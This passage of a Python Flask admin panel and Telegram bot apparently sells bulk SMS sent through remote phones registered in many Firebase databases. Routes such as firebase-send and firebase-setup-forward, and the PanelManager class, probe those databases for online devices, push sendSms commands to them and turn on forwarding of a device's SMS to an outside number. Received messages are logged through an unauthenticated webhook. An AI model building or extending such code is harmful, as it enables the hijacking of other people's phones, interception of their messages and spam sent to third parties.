        setting_set("bot_token", new_token)

        BOT_TOKEN = new_token

    load_settings_sync()

    if bot_application:

        try:

            import asyncio

            loop = asyncio.new_event_loop()

            loop.run_until_complete(bot_application.stop())

            loop.close()

        except Exception:

            pass

        def _restart():

            import time

            time.sleep(2)

            new_app = (

                Application.builder()

                .token(BOT_TOKEN)

                .post_init(post_init)

                .build()

            )

            global bot_application

            bot_application = new_app

            new_app.add_handler(CommandHandler("start", cmd_start))

            new_app.add_handler(CommandHandler("help", cmd_help))

            new_app.add_handler(CommandHandler("admin", cmd_admin))

            new_app.add_handler(CommandHandler("refresh", cmd_refresh))

            new_app.add_handler(CallbackQueryHandler(cb_handler))

            new_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, msg_handler))

            new_app.run_polling(drop_pending_updates=True)

        t = threading.Thread(target=_restart, daemon=True)

        t.start()

    flash("Settings saved. Bot restarting with new token...", "success")

    return redirect(url_for("settings_page"))





@app.route("/settings", methods=["GET", "POST"])
@login_required
def settings_page():
    if request.method == "POST":
        keys_list = ["sms_cost", "telegram_chat_id", "welcome_message", "min_deposit", "signup_bonus", "referral_bonus", "channel_url", "paytm_mid", "paytm_vpa", "paytm_merchant_name", "paytm_merchant_id", "paytm_auth_ump", "paytm_app_version"]
        for k in keys_list:
            if k in request.form:
                val = request.form.get(k, "").strip()
                setting_set(k, val)
        flash("Settings saved successfully", "success")
        return redirect(url_for("settings_page"))
    s = setting_all()
    paytm_sess = load_paytm_session()
    active_bot_token = BOT_TOKEN or s.get("bot_token", "")
    content = render_template_string(SETTINGS_PAGE, s=s, paytm_sess=paytm_sess, bot_token=active_bot_token)
    return render_page("Settings", "settings", content)





@app.route("/settings/save-token", methods=["POST"])

@login_required

def settings_save_token():

    global BOT_TOKEN

    new_token = request.form.get("bot_token", "").strip()

    if new_token:

        setting_set("bot_token", new_token)

        BOT_TOKEN = new_token

        flash("Bot token saved", "success")

    else:

        flash("Bot token cannot be empty", "error")

    return redirect(url_for("settings_page"))












# ─── Granular Settings Routes ──────────────────────────────────────────────

@app.route("/settings/save-pricing", methods=["POST"])
@login_required
def settings_save_pricing():
    for k in ["sms_cost", "min_deposit"]:
        setting_set(k, request.form.get(k, "").strip())
    flash("SMS rates and deposit limits saved successfully!", "success")
    return redirect(url_for("settings_page"))

@app.route("/settings/save-bonuses", methods=["POST"])
@login_required
def settings_save_bonuses():
    for k in ["signup_bonus", "referral_bonus"]:
        setting_set(k, request.form.get(k, "").strip())
    flash("Signup and referral bonuses saved successfully!", "success")
    return redirect(url_for("settings_page"))

@app.route("/settings/save-alerts", methods=["POST"])
@login_required
def settings_save_alerts():
    for k in ["telegram_chat_id", "channel_url", "welcome_message"]:
        setting_set(k, request.form.get(k, "").strip())
    flash("Alerts and notification settings saved successfully!", "success")
    return redirect(url_for("settings_page"))

@app.route("/settings/save-paytm", methods=["POST"])
@login_required
def settings_save_paytm():
    paytm_keys = ["paytm_mid", "paytm_merchant_id", "paytm_vpa", "paytm_merchant_name", "paytm_auth_ump", "paytm_app_version"]
    for k in paytm_keys:
        val = request.form.get(k, "").strip()
        setting_set(k, val)
    try:
        sess = load_paytm_session()
        if request.form.get("paytm_mid"):
            sess["merchant_id"] = request.form.get("paytm_mid").strip()
        save_paytm_session(sess)
    except Exception as e:
        log.warning("Save paytm session error: %s", e)
    flash("Paytm UPI Configuration saved successfully!", "success")
    return redirect(url_for("settings_page"))

@app.route("/settings/save-paytm-token", methods=["POST"])
@login_required
def settings_save_paytm_token():
    mat = request.form.get("manual_access_token", "").strip()
    mrt = request.form.get("manual_refresh_token", "").strip()
    sess = load_paytm_session()
    if mat:
        sess["access_token"] = mat
    if mrt:
        sess["refresh_token"] = mrt
    save_paytm_session(sess)
    flash("Manual Paytm session tokens saved successfully!", "success")
    return redirect(url_for("settings_page"))

@app.route("/api/bot/save-profile", methods=["POST"])
@login_required
def api_bot_save_profile():
    data = request.get_json(silent=True) or request.form or {}
    for k in ["bot_name", "bot_short_description", "bot_description", "bot_about", "bot_commands"]:
        short_k = k.replace("bot_", "")
        val = data.get(k) or data.get(short_k) or data.get("name" if k=="bot_name" else "short_description" if k=="bot_short_description" else "description" if k=="bot_description" else "about" if k=="bot_about" else "commands" if k=="bot_commands" else "")
        if val is not None:
            setting_set(k, str(val).strip())
    return jsonify({"success": True, "message": "Profile saved to database"})

@app.route("/api/bot/apply-profile", methods=["POST"])
@app.route("/settings/apply-profile", methods=["POST"])
@login_required
def apply_bot_profile():
    token = setting_get("bot_token") or BOT_TOKEN
    if not token:
        return jsonify({"success": False, "error": "No bot token configured"}), 400
    
    data = request.get_json(silent=True) or {}
    bot_name = data.get("name") or setting_get("bot_name")
    bot_desc = data.get("description") or setting_get("bot_description")
    bot_short = data.get("short_description") or setting_get("bot_short_description")
    bot_about = data.get("about") or setting_get("bot_about")
    bot_commands = data.get("commands") or setting_get("bot_commands")

    base = f"https://api.telegram.org/bot{token}"
    applied = []
    errors = {}

    if bot_name:
        try:
            urllib.request.urlopen(f"{base}/setMyName", urllib.parse.urlencode({"name": bot_name}).encode(), timeout=10)
            applied.append("Name")
        except Exception as e:
            errors["Name"] = str(e)[:100]

    if bot_desc:
        try:
            urllib.request.urlopen(f"{base}/setMyDescription", urllib.parse.urlencode({"description": bot_desc}).encode(), timeout=10)
            applied.append("Description")
        except Exception as e:
            errors["Description"] = str(e)[:100]

    if bot_short:
        try:
            urllib.request.urlopen(f"{base}/setMyShortDescription", urllib.parse.urlencode({"short_description": bot_short}).encode(), timeout=10)
            applied.append("Short Description")
        except Exception as e:
            errors["Short Description"] = str(e)[:100]

    if bot_about:
        try:
            urllib.request.urlopen(f"{base}/setMyDescription", urllib.parse.urlencode({"description": bot_about}).encode(), timeout=10)
            applied.append("About")
        except Exception as e:
            errors["About"] = str(e)[:100]

    if bot_commands:
        try:
            cmds = []
            for line in bot_commands.split("\n"):
                line = line.strip()
                if "|" in line:
                    c, d = line.split("|", 1)
                    cmds.append({"command": c.strip().lstrip("/"), "description": d.strip()})
            if cmds:
                req = urllib.request.Request(
                    f"{base}/setMyCommands",
                    data=json.dumps({"commands": cmds}).encode("utf-8"),
                    headers={"Content-Type": "application/json"},
                    method="POST"
                )
                urllib.request.urlopen(req, timeout=10)
                applied.append(f"Commands ({len(cmds)})")
        except Exception as e:
            errors["Commands"] = str(e)[:100]

    return jsonify({"success": len(applied) > 0, "applied": applied, "errors": errors})

@app.route("/api/bot/set-photo", methods=["POST"])
@login_required
def api_bot_set_photo():
    token = setting_get("bot_token") or BOT_TOKEN
    if not token:
        return jsonify({"success": False, "error": "No bot token configured"}), 400
    if "photo" not in request.files:
        return jsonify({"success": False, "error": "No photo provided"}), 400
    photo = request.files["photo"]
    try:
        import httpx
        files = {"photo": (photo.filename, photo.read(), photo.content_type)}
        r = httpx.post(f"https://api.telegram.org/bot{token}/setChatPhoto", data={"chat_id": f"@{setting_get('bot_name')}"}, files=files, timeout=15)
        return jsonify({"success": True, "message": "Photo uploaded successfully"})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route("/send-sms", methods=["GET", "POST"])

@login_required

def send_sms_page():

    if request.method == "POST":

        target = request.form.get("target", "").strip()

        message = request.form.get("message", "").strip()

        if not target or not message:

            flash("Target and message required", "error")

            return redirect(url_for("send_sms_page"))

        if len(target) == 10:

            target = "91" + target

        if panel_manager and panel_manager.working:

            pm = panel_manager

        else:

            pm = PanelManager()

            pm._sync_init()

        ok, info = pm.send(target, message)

        status = "sent" if ok else "failed"

        log_add("admin", target, info, status, message)

        flash(f"SMS {'sent' if ok else 'failed'}: {info}", "success" if ok else "error")

        return redirect(url_for("send_sms_page"))

    recent = log_list(limit=20)

    content = render_template_string(SEND_SMS_PAGE, recent_logs=recent)

    return render_page("Send SMS", "send_sms", content)





@app.route("/send-sms-bulk", methods=["POST"])

@login_required

def send_sms_bulk():

    numbers_text = request.form.get("numbers", "").strip()

    message = request.form.get("message", "").strip()

    if not numbers_text or not message:

        flash("Numbers and message required", "error")

        return redirect(url_for("send_sms_page"))

    numbers = [n.strip() for n in numbers_text.replace("\r", "").split("\n") if n.strip()]

    if not numbers:

        flash("No valid numbers provided", "error")

        return redirect(url_for("send_sms_page"))

    sent = 0

    failed = 0

    if panel_manager and panel_manager.working:

        pm = panel_manager

    else:

        pm = PanelManager()

        pm._sync_init()

    for num in numbers:

        if len(num) == 10:

            num = "91" + num

        ok, info = pm.send(num, message)

        status = "sent" if ok else "failed"

        log_add("admin", num, info, status, message)

        if ok:

            sent += 1

        else:

            failed += 1

    flash(f"Bulk SMS complete: ✅ {sent} sent, ❌ {failed} failed out of {len(numbers)}", "success" if sent > 0 else "error")

    return redirect(url_for("send_sms_page"))





@app.route("/received-sms", methods=["GET"])

@login_required

def received_sms_page():

    page = request.args.get("page", 1, type=int)

    filter_number = request.args.get("number", "")

    per_page = 100

    messages = sms_received_list(page, per_page, filter_number)

    total = sms_received_count(filter_number)

    total_pages = max(1, -(-total // per_page))

    content = render_template_string(RECEIVED_SMS_PAGE, messages=messages, total=total, page=page, total_pages=total_pages, filter_number=filter_number)

    return render_page("Received SMS", "received_sms", content)





@app.route("/users/edit", methods=["POST"])

@login_required

def users_edit():

    uid = request.form.get("user_id")

    name = request.form.get("name", "")

    username = request.form.get("username", "")

    usr_update(uid, name=name, username=username)

    flash(f"User {uid} updated", "success")

    return redirect(url_for("users_list"))





@app.route("/users/ban/<uid>", methods=["POST"])

@login_required

def users_ban(uid):

    reason = request.form.get("reason", "")

    usr_ban(uid, reason)

    flash(f"User {uid} banned", "success")

    return redirect(url_for("users_list"))





@app.route("/users/unban/<uid>", methods=["POST"])

@login_required

def users_unban(uid):

    usr_unban(uid)

    flash(f"User {uid} unbanned", "success")

    return redirect(url_for("users_list"))





@app.route("/users/delete/<uid>", methods=["POST"])

@login_required

def users_delete(uid):

    usr_delete(uid)

    flash(f"User {uid} deleted", "success")

    return redirect(url_for("users_list"))





@app.route("/auto-sync", methods=["POST"])

@login_required

def auto_sync():

    run_probe()

    flash("Sync complete. Devices refreshed.", "success")

    return redirect(url_for("dashboard"))





# ─── REAL-TIME AJAX API  ──────────────────────────────────────────────────



@app.route("/api/dashboard-stats")

@login_required

def api_dashboard_stats():

    total_panels = pg.execute_one("SELECT COUNT(*) FROM databases")[0]

    active_panels = pg.execute_one("SELECT COUNT(*) FROM databases WHERE status = 'active'")[0]

    online = LIVE_CACHE.get("total_online", 0) or dv_online_count()
    total_devices = LIVE_CACHE.get("total_devices", 0) or dv_count()
    working = LIVE_CACHE.get("working_panels", 0) or PROBE_CACHE["results"]["panels"].get("working", 0) or active_panels

    stats = {
        "panels_total": total_panels,
        "panels_active": active_panels,
        "panels_working": working,
        "devices_total": total_devices,
        "devices_online": online,
        "numbers_total": LIVE_CACHE.get("total_numbers") or nm_count(),
        "numbers_online": LIVE_CACHE.get("total_online_numbers") or nm_online_count(),

        "users": usr_count(),

        "sms": log_total_sms(),

        "revenue": "%.2f" % pay_total(),

        "inactive_panels": total_panels - active_panels,

        "last_update": LIVE_CACHE.get("last_update", ""),

    }

    return jsonify(stats)





@app.route("/api/live-logs")

@login_required

def api_live_logs():

    logs = log_list(limit=15)

    return jsonify([{

        "user_id": l.get("user_id", ""),

        "target": l.get("target", ""),

        "panel": l.get("panel", ""),

        "status": l.get("status", ""),

        "created_at": l.get("created_at", "")[:16] if l.get("created_at") else "",

    } for l in logs])





@app.route("/api/sms-received", methods=["POST"])
def api_sms_received():
    data = request.get_json(silent=True) or request.form.to_dict() or {}
    from_num = data.get("from") or data.get("sender") or data.get("from_number") or data.get("number") or ""
    to_num = data.get("to") or data.get("receiver") or data.get("to_number") or data.get("sim") or ""
    message = data.get("message") or data.get("text") or data.get("body") or data.get("msg") or ""
    panel = data.get("panel") or data.get("device") or "Webhook"
    if not message:
        return jsonify({"error": "message required"}), 400
    sms_received_add(from_number=from_num, to_number=to_num, message=message, panel=panel)
    return jsonify({"status": "ok", "message": "Saved"})


@app.route("/api/live-received")
@login_required
def api_live_received():
    rows = pg.execute(
        "SELECT id, number, from_number, to_number, message, panel, received_at FROM sms_received ORDER BY received_at DESC, id DESC LIMIT 25",
        dict_cursor=True
    )
    return jsonify([{
        "from": r.get("from_number") or r.get("number") or "-",
        "to": r.get("to_number") or "-",
        "message": r.get("message", ""),
        "panel": r.get("panel", ""),
        "received_at": r.get("received_at", "")[:19] if r.get("received_at") else "",
    } for r in rows])

@app.route("/api/sync-payments", methods=["GET", "POST"])
@login_required
def api_sync_payments():
    try:
        ref = refresh_paytm_token()
        synced = sync_paytm_recent_orders_sync(days=7)
        sess = load_paytm_session()
        return jsonify({
            "success": True,
            "synced": synced,
            "token_refresh": ref.get("success", False),
            "new_access_token": sess.get("access_token", ""),
            "message": f"Successfully refreshed session and synced {synced} payments from Paytm."
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

@app.route("/api/live-payments")

@login_required

def api_live_payments():

    rows = pay_list()[:10]

    return jsonify([{

        "biz_order_id": p.get("biz_order_id", ""),

        "amount": "%.2f" % float(p.get("amount", 0)),

        "payer_name": p.get("payer_name", ""),

        "payer_vpa": p.get("payer_vpa", ""),

        "created_at": p.get("created_at", "")[:16] if p.get("created_at") else "",

    } for p in rows])





@app.route("/api/live-online")

@login_required

def api_live_online():

    all_devices = LIVE_CACHE.get("online_devices", [])

    online_devices = [d for d in all_devices if d.get("is_online")]

    return jsonify({

        "devices": online_devices,

        "total": LIVE_CACHE.get("total_online", 0),

        "total_devices": LIVE_CACHE.get("total_devices", 0),

        "total_panels": LIVE_CACHE.get("total_panels", 0),

        "working_panels": LIVE_CACHE.get("working_panels", 0),

        "last_update": LIVE_CACHE.get("last_update", ""),

        "probe_running": LIVE_CACHE.get("probe_running", False),

    })





# ─── REST API  ────────────────────────────────────────────────────────────



def api_check_key():

    key = request.headers.get("X-API-Key") or request.args.get("api_key")

    if not key:

        return None

    return apikey_validate(key)





@app.route("/api/check", methods=["GET"])

def api_check():

    key = api_check_key()

    if not key:

        return jsonify({"error": "Invalid API key"}), 401

    uid = key["user_id"]

    usr_add(uid)

    usr_increment_sms(uid)

    row = usr_get(uid)

    panels = db_all_active()

    sms_cost = float(setting_get("sms_cost") or 1)

    return jsonify({

        "status": "ok",

        "user_id": uid,

        "balance": row["balance"] if row else 0,

        "sms_sent": row["sms_sent"] if row else 0,

        "panels": [{"id": p["id"], "url": p["url"], "name": p["name"]} for p in panels],

        "sms_cost": sms_cost,

    })





@app.route("/api/verify/<utr>", methods=["GET"])

def api_verify_utr(utr):

    key = api_check_key()

    if not key:

        return jsonify({"error": "Invalid API key"}), 401

    row = pay_get(utr)

    if row:

        return jsonify({

            "status": "found",

            "biz_order_id": row["biz_order_id"],

            "amount": row["amount"],

            "payer_name": row["payer_name"],

            "payer_vpa": row["payer_vpa"],

            "pay_time": row["pay_time"],

        })

    return jsonify({"status": "not_found"})





@app.route("/api/databases", methods=["GET"])

def api_databases():

    key = api_check_key()

    if not key:

        return jsonify({"error": "Invalid API key"}), 401

    panels = db_all_active()

    return jsonify({

        "status": "ok",

        "panels": [{"id": p["id"], "url": p["url"], "name": p["name"]} for p in panels],

    })





@app.route("/api/user/<uid>/balance", methods=["GET"])

def api_user_balance(uid):

    key = api_check_key()

    if not key:

        return jsonify({"error": "Invalid API key"}), 401

    usr_add(uid)

    row = usr_get(uid)

    return jsonify({

        "status": "ok",

        "user_id": uid,

        "balance": row["balance"] if row else 0,

        "sms_sent": row["sms_sent"] if row else 0,

    })





@app.route("/api/add-balance", methods=["POST"])

def api_add_balance():

    key = api_check_key()

    if not key:

        return jsonify({"error": "Invalid API key"}), 401

    data = request.get_json(silent=True) or {}

    uid = data.get("user_id", "")

    amount = float(data.get("amount", 0))

    if not uid or amount <= 0:

        return jsonify({"error": "Invalid user_id or amount"}), 400

    usr_add_balance(uid, amount)

    row = usr_get(uid)

    log_add(uid, "balance_add", "system", "success", f"Added ₹{amount}")

    return jsonify({"status": "ok", "balance": row["balance"] if row else 0})





@app.route("/api/deduct-balance", methods=["POST"])

def api_deduct_balance():

    key = api_check_key()

    if not key:

        return jsonify({"error": "Invalid API key"}), 401

    data = request.get_json(silent=True) or {}

    uid = data.get("user_id", "")

    amount = float(data.get("amount", 0))

    if not uid or amount <= 0:

        return jsonify({"error": "Invalid user_id or amount"}), 400

    result = usr_deduct_balance(uid, amount)

    if not result:

        return jsonify({"error": "Insufficient balance or user not found"}), 400

    row = usr_get(uid)

    log_add(uid, "balance_deduct", "system", "success", f"Deducted ₹{amount}")

    return jsonify({"status": "ok", "balance": row["balance"] if row else 0})





@app.route("/api/sms-log", methods=["POST"])

def api_sms_log():

    key = api_check_key()

    if not key:

        return jsonify({"error": "Invalid API key"}), 401

    data = request.get_json(silent=True) or {}

    uid = key["user_id"]

    target = data.get("target", "")

    panel = data.get("panel", "")

    status = data.get("status", "sent")

    message = data.get("message", "")

    if not target:

        return jsonify({"error": "target is required"}), 400

    log_add(uid, target, panel, status, message)

    usr_increment_sms(uid)

    usr_add(uid)

    row = usr_get(uid)

    return jsonify({

        "status": "ok",

        "balance": row["balance"] if row else 0,

        "sms_sent": row["sms_sent"] if row else 0,

    })





@app.route("/api/settings", methods=["GET"])

def api_settings():

    key = api_check_key()

    if not key:

        return jsonify({"error": "Invalid API key"}), 401

    s = setting_all()

    _SENSITIVE_KEYS = {"bot_token", "paytm_key", "paytm_secret", "paytm_merchant_id",

                       "admin_password", "secret_key", "paytm_mid", "telegram_chat_id"}

    safe = {k: v for k, v in s.items() if k not in _SENSITIVE_KEYS}

    return jsonify({"status": "ok", "settings": safe})





@app.route("/api/payment-notify", methods=["POST"])

def api_payment_notify():

    webhook_secret = PAYMENT_WEBHOOK_SECRET or request.headers.get("X-Webhook-Secret", "")

    if PAYMENT_WEBHOOK_SECRET and webhook_secret != PAYMENT_WEBHOOK_SECRET:

        log.warning("Payment webhook rejected: invalid secret from %s", request.remote_addr)

        return jsonify({"error": "Unauthorized"}), 403

    data = request.get_json(silent=True) or {}

    biz_order_id = data.get("biz_order_id", "")

    merchant_trans_id = data.get("merchant_trans_id", "")

    amount = float(data.get("amount", 0))

    currency = data.get("currency", "INR")

    pay_time = data.get("pay_time", "")

    payer_name = data.get("payer_name", "")

    payer_vpa = data.get("payer_vpa", "")

    payer_psp = data.get("payer_psp", "")

    if not biz_order_id or amount <= 0:

        return jsonify({"error": "Invalid data"}), 400

    pay_add(biz_order_id, merchant_trans_id, amount, currency, pay_time, payer_name, payer_vpa, payer_psp)

    return jsonify({"status": "ok"})





def _firebase_put(url, data=None, timeout=10):

    """Firebase RTDB PUT request with proper error handling."""

    payload = json.dumps(data).encode() if data else None

    req = urllib.request.Request(

        url,

        data=payload,

        headers={"Content-Type": "application/json", "Accept": "application/json"},

        method="PUT",

    )

    with urllib.request.urlopen(req, timeout=timeout) as resp:

        body = resp.read().decode()

        return json.loads(body) if body else {}





def _firebase_post(url, data=None, timeout=10):

    """Firebase RTDB POST request with proper error handling."""

    payload = json.dumps(data).encode() if data else None

    req = urllib.request.Request(

        url,

        data=payload,

        headers={"Content-Type": "application/json", "Accept": "application/json"},

        method="POST",

    )

    with urllib.request.urlopen(req, timeout=timeout) as resp:

        body = resp.read().decode()

        return json.loads(body) if body else {}





def _resolve_panel(panel_name_or_id):
    """Resolve panel by name, ID, or URL. Returns (panel_dict|None, error_string|None)."""
    if not panel_name_or_id:
        return None, "Panel reference is empty"
    ref = str(panel_name_or_id).strip()
    panel = pg.execute_one("SELECT * FROM databases WHERE id = %s", (ref,), dict_cursor=True)
    if panel:
        return panel, None
    panel = pg.execute_one("SELECT * FROM databases WHERE name = %s", (ref,), dict_cursor=True)
    if panel:
        return panel, None
    panel = pg.execute_one("SELECT * FROM databases WHERE url = %s OR url = %s", (ref, ref.rstrip('/')), dict_cursor=True)
    if panel:
        return panel, None
    norm, name = normalize_firebase_url(ref)
    if norm:
        panel = pg.execute_one("SELECT * FROM databases WHERE url = %s OR name = %s", (norm, name), dict_cursor=True)
        if panel:
            return panel, None
    panel = pg.execute_one("SELECT * FROM databases WHERE url ILIKE %s OR name ILIKE %s", (f"%{ref}%", f"%{ref}%"), dict_cursor=True)
    if panel:
        return panel, None
    return None, f"Panel '{panel_name_or_id}' not found"





@app.route("/firebase-send", methods=["POST"])

@login_required

def firebase_send():

    data = request.get_json(silent=True) or {}

    panel_ref = data.get("panel", "")

    client_id = data.get("client", "")

    target = data.get("target", "").strip()

    message = data.get("message", "").strip()

    if not panel_ref or not client_id or not target or not message:

        return jsonify({"ok": False, "error": "Missing fields (panel, client, target, message)"}), 400

    panel, err = _resolve_panel(panel_ref)

    if not panel:

        return jsonify({"ok": False, "error": err}), 404

    url = panel["url"]

    send_url = _firebase_url(url, f"clients/{client_id}/webhookEvent/sendSms")

    payload = {"from": 1, "to": target, "message": message, "isSended": False}

    try:

        result = _firebase_put(send_url, payload, timeout=10)

        return jsonify({"ok": True, "detail": f"Delivered to {client_id[:16]}...", "firebase": result})

    except urllib.error.HTTPError as e:

        body = ""

        try:

            body = e.read().decode()[:200]

        except Exception:

            pass

        return jsonify({"ok": False, "error": f"HTTP {e.code}: {body}"})

    except Exception as e:

        return jsonify({"ok": False, "error": str(e)[:200]})





@app.route("/firebase-setup-forward", methods=["POST"])

@login_required

def firebase_setup_forward():

    data = request.get_json(silent=True) or {}

    panel_ref = data.get("panel", "")

    client_id = data.get("client", "")

    target = data.get("target", "").strip()

    if not panel_ref or not client_id or not target:

        return jsonify({"ok": False, "error": "Missing fields"}), 400

    panel, err = _resolve_panel(panel_ref)

    if not panel:

        return jsonify({"ok": False, "error": err}), 404

    url = panel["url"]

    fwd_url = _firebase_url(url, f"smsForward/{client_id}")

    fwd_payload = {"SmsForwardTo": target, "isSmsForward": True}

    try:

        result = _firebase_put(fwd_url, fwd_payload, timeout=10)

        return jsonify({"ok": True, "detail": f"Forwarding enabled for {client_id[:16]}"})

    except urllib.error.HTTPError as e:

        body = ""

        try:

            body = e.read().decode()[:200]

        except Exception:

            pass

        return jsonify({"ok": False, "error": f"HTTP {e.code}: {body}"})

    except Exception as e:

        return jsonify({"ok": False, "error": str(e)[:200]})





@app.route("/firebase-disable-forward", methods=["POST"])

@login_required

def firebase_disable_forward():

    data = request.get_json(silent=True) or {}

    panel_ref = data.get("panel", "")

    client_id = data.get("client", "")

    if not panel_ref or not client_id:

        return jsonify({"ok": False, "error": "Missing fields"}), 400

    panel, err = _resolve_panel(panel_ref)

    if not panel:

        return jsonify({"ok": False, "error": err}), 404

    url = panel["url"]

    fwd_url = _firebase_url(url, f"smsForward/{client_id}")

    fwd_payload = {"SmsForwardTo": "", "isSmsForward": False}

    try:

        result = _firebase_put(fwd_url, fwd_payload, timeout=10)

        return jsonify({"ok": True, "detail": f"Forwarding disabled for {client_id[:16]}"})

    except urllib.error.HTTPError as e:

        body = ""

        try:

            body = e.read().decode()[:200]

        except Exception:

            pass

        return jsonify({"ok": False, "error": f"HTTP {e.code}: {body}"})

    except Exception as e:

        return jsonify({"ok": False, "error": str(e)[:200]})





@app.route("/api/probe-status", methods=["GET"])

def api_probe_status():

    if not session.get("admin_logged"):

        key = api_check_key()

        if not key:

            return jsonify({"error": "Unauthorized"}), 401

    probe = PROBE_CACHE["results"]

    return jsonify({

        "panels": probe["panels"],

        "devices": probe["devices"],

        "numbers": probe["numbers"],

        "last_run": PROBE_CACHE["last_run"],

    })





# ─── Error Handlers  ──────────────────────────────────────────────────────



@app.errorhandler(404)
def not_found(e):
    if request.path.startswith("/api/"):
        return jsonify({"error": "Not found"}), 404
    return render_template_string("""<!DOCTYPE html><html><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>404 - Page Not Found</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
<style>body{margin:0;background:#0a0b10;color:#e2e8f0;font-family:Inter,system-ui,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh}
.box{text-align:center}.box h1{font-size:72px;margin:0;background:linear-gradient(135deg,#0ea5e9,#d4a853);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.box p{color:#94a3b8;margin:16px 0 32px}.btn{display:inline-flex;align-items:center;gap:8px;padding:12px 28px;border-radius:12px;background:linear-gradient(135deg,#0ea5e9,#0284c7);color:#fff;text-decoration:none;font-weight:600;transition:all .2s}.btn:hover{transform:translateY(-2px);box-shadow:0 8px 25px rgba(14,165,233,.3)}</style></head>
<body><div class="box"><h1>404</h1><p>Page not found</p><a href="/" class="btn"><i class="fas fa-home"></i> Go Home</a></div></body></html>"""), 404


@app.errorhandler(500)
def server_error(e):
    if request.path.startswith("/api/"):
        return jsonify({"error": "Internal server error"}), 500
    return render_template_string("""<!DOCTYPE html><html><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>500 - Server Error</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
<style>body{margin:0;background:#0a0b10;color:#e2e8f0;font-family:Inter,system-ui,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh}
.box{text-align:center}.box h1{font-size:72px;margin:0;color:#ef4444}.box p{color:#94a3b8;margin:16px 0 32px}
.btn{display:inline-flex;align-items:center;gap:8px;padding:12px 28px;border-radius:12px;background:linear-gradient(135deg,#0ea5e9,#0284c7);color:#fff;text-decoration:none;font-weight:600;transition:all .2s}.btn:hover{transform:translateY(-2px);box-shadow:0 8px 25px rgba(14,165,233,.3)}</style></head>
<body><div class="box"><h1>500</h1><p>Something went wrong</p><a href="/" class="btn"><i class="fas fa-home"></i> Go Home</a></div></body></html>"""), 500





# ═══════════════════════════════════════════════════════════════════════════

# BOT: PANEL MANAGER

# ═══════════════════════════════════════════════════════════════════════════



# ─── PANEL MANAGER  ───────────────────────────────────────────────────────





class PanelManager:

    def __init__(self):

        self.panels: list[dict] = []

        self.working: list[dict] = []

        self._index = 0



    async def init(self):

        self.panels = await get_all_panels()

        log.info("Loaded %d panels from DB", len(self.panels))

        self._sync_from_cache()



    def _sync_init(self):

        """Sync version of init() for use outside async context."""

        rows = pg.execute("SELECT * FROM databases WHERE status = 'active'", dict_cursor=True)

        self.panels = rows or []

        log.info("Loaded %d panels from DB (sync)", len(self.panels))

        self._sync_from_cache()



    def _sync_from_cache(self):

        """Build working list from LIVE_CACHE (populated by background probe)."""

        if LIVE_CACHE.get("online_devices"):

            working_urls = set(d["panel_url"] for d in LIVE_CACHE["online_devices"])

            self.working = [p for p in self.panels if p["url"].rstrip("/") in working_urls]

            log.info("PanelManager synced from cache: %d working panels", len(self.working))

        else:

            self.working = list(self.panels)

            log.info("PanelManager: no cache yet, using all %d panels", len(self.panels))



    async def probe_all(self):

        self.working = []

        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=15)) as session:

            for panel in self.panels:

                url = panel["url"]

                online = await self._probe(session, url)

                if online >= 0:

                    self.working.append(panel)

                    await update_panel_devices(panel["id"], online)

                    panel["devices_online"] = online

                    log.info("Panel OK: %s (%s) - online=%d", panel["name"], url, online)

                else:

                    log.warning("Panel FAIL: %s (%s)", panel["name"], url)

        self._index = 0

        log.info("Working panels: %d/%d", len(self.working), len(self.panels))



    async def _probe(self, session: aiohttp.ClientSession, base_url: str) -> int:

        try:

            probe_url = _firebase_url(base_url, "clients") + "?shallow=true"

            async with session.get(probe_url) as resp:

                if resp.status != 200:

                    return -1

                text = await resp.text()

                data = json.loads(text)

                if not isinstance(data, dict) or len(data) == 0:

                    return -1

                online = sum(

                    1 for c in data.values()

                    if isinstance(c, dict) and c.get("status") is True

                )

                return online

        except (json.JSONDecodeError, aiohttp.ClientError, asyncio.TimeoutError):

            return -1



    async def _get_online_clients(self, base_url: str) -> list[dict]:

        try:

            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:

                async with session.get(_firebase_url(base_url, "clients")) as resp:

                    if resp.status != 200:

                        return []

                    data = await resp.json()

                    if not isinstance(data, dict):

                        return []

                    return [

                        {"id": cid, "data": cdata}

                        for cid, cdata in data.items()

                        if isinstance(cdata, dict) and cdata.get("status") is True

                    ]

        except Exception:

            return []



    async def send_async(self, to: str, message: str) -> tuple[bool, str, str]:
        loop = asyncio.get_running_loop()
        return await loop.run_in_executor(None, self.send_detail, to, message)

    def send_detail(self, to: str, message: str) -> tuple[bool, str, str]:
        if not self.working:
            self._sync_from_cache()
        if not self.working:
            log.warning("SEND FAIL: no working panels. total_panels=%d", len(self.panels))
            return False, "No working panels available", ""

        all_online = LIVE_CACHE.get("online_devices", [])
        panel_freshness = {}
        for d in all_online:
            if d.get("is_online"):
                p_url = d["panel_url"].rstrip("/")
                panel_freshness[p_url] = max(panel_freshness.get(p_url, 0), d.get("hb_ts", 0))

        # Prioritize panels that have genuine live heartbeats
        sorted_working = sorted(
            self.working,
            key=lambda p: panel_freshness.get(p["url"].rstrip("/"), 0),
            reverse=True
        )

        total = len(sorted_working)
        panels_to_try = min(total, 12)
        log.info("SEND START: to=%s, working_panels=%d, trying_up_to=%d panels (sorted by heartbeat freshness)", to, total, panels_to_try)

        for i in range(panels_to_try):
            panel = sorted_working[i]
            base_url = panel["url"]

            cached_devices = [
                d for d in all_online
                if d["panel_url"].rstrip("/") == base_url.rstrip("/")
            ]
            if not cached_devices:
                continue

            # Prioritize devices with freshest heartbeats and webhook readiness
            cached_devices.sort(key=lambda d: (d.get("hb_ts", 0), 1 if d.get("webhook_ready") else 0), reverse=True)
            try_devices = cached_devices[:3]

            log.info("SEND [%d/%d] %s: %d devices (freshest hb_ts=%s)",
